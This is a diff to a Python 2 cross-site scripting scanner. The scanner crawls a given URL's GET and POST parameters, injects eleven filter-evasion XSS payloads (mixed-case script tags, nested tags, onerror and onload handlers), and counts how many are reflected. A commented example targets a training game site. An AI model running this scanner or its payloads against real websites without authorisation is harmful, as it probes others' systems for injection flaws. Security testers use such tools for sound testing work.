@@ -14,13 +14,11 @@ class Xss(object):
         self.url = url
         self.get = []
         self.post = []
-        self.headers = [("Content-type", "application/x-www-form-urlencoded")
-            , ('User-Agent',
-               'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.0.14) Gecko/2009082706 Firefox/3.0.14')
-            , ("Accept", "text/plain")]
-        self.cj = CookieJar()
-        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj))
-        self.opener.addheaders = self.headers
+        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(CookieJar()))
+        self.opener.addheaders = [("Content-type", "application/x-www-form-urlencoded"),
+                                 ('User-Agent',
+                                  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.0.14) Gecko/2009082706 Firefox/3.0.14'),
+                                  ("Accept", "text/plain")]
         self.vectors = 0
         self.success = 0
 
@@ -29,7 +27,6 @@ class Xss(object):
         resp = self.opener.open(self.url).read()
         doc = fromstring(resp)
         doc.make_links_absolute(self.url)
-
         for (el, attr, link, pos) in doc.iterlinks():
             href = link.split("?")
             if len(href) == 2:
@@ -63,7 +60,7 @@ class Xss(object):
         self.vectors = (len(self.get) + len(self.post)) / 11
 
     def scan(self):
-        print "Scanning " + str(self.vectors) + " vector(s)"
+        print "Scanning " + str(self.vectors) + " vectors"
 
         for request in self.get:
             print "GET " + request
@@ -91,31 +88,27 @@ class Xss(object):
             self.success += 1
             print "Found XSS Vulnerability..."
 
-""" Main """
-if __name__ == "__main__":
-    from optparse import OptionParser
 
-    payloads = ["<ScrIpt>alert('XSSVVVV')</scRiPt>",
-             "<sc<script>ript>alert('XSSVVVV')<</script>/script>",
-             "<scscriPtript>alert('XSSVVVV')</scrscRiptipt>",
-             "<ImG SRC=JaVaScRiPt:alert('XSSVVVV')",
-             "<ImG \"\"\"><SCRIPT>alert(\"XSSVVVV\")</SCRIPT>\">",
-             "<ImG src = XVVVV.jpg onerror=\"javascript:alert('XSSVVVV')\"/>",
-             "<ImG DYNSRC=\"javascript:alert('XSSVVVV')\">",
-             "</TITLE><SCRIPT>alert(\"XSSVVVV\");</SCRIPT>",
-             "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSSVVVV');\">",
-             "<BODY ONLOAD=alert('XSSVVVV')>",
-             "<BODY BACKGROUND=\"javascript:alert('XSSVVVV')\">"]
-
-    parser = OptionParser()
-    (options, args) = parser.parse_args()
-    if len(args) == 1:
-        xss = Xss(args[0])
+class execxss:
+    def run(self, url):
+        payloads = ["<ScrIpt>alert('XSSVVVV')</scRiPt>",
+                    "<sc<script>ript>alert('XSSVVVV')<</script>/script>",
+                    "<scscriPtript>alert('XSSVVVV')</scrscRiptipt>",
+                    "<ImG SRC=JaVaScRiPt:alert('XSSVVVV')",
+                    "<ImG \"\"\"><SCRIPT>alert(\"XSSVVVV\")</SCRIPT>\">",
+                    "<ImG src = XVVVV.jpg onerror=\"javascript:alert('XSSVVVV')\"/>",
+                    "<ImG DYNSRC=\"javascript:alert('XSSVVVV')\">",
+                    "</TITLE><SCRIPT>alert(\"XSSVVVV\");</SCRIPT>",
+                    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSSVVVV');\">",
+                    "<BODY ONLOAD=alert('XSSVVVV')>",
+                    "<BODY BACKGROUND=\"javascript:alert('XSSVVVV')\">"]
+        xss = Xss(url)
         for script in payloads:
             xss.parse(script)
         xss.scan()
-        print "Succeed XSS :" + str(xss.success) + " of 11"
-    else:
-        print "Error: %s takes one argument (the website)" % sys.argv[0]
+        print "Succeed XSS :" + str(xss.success)
 
 # https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#META
+
+# call = execxss()
+# call.run("https://xss-game.appspot.com/level1/frame")
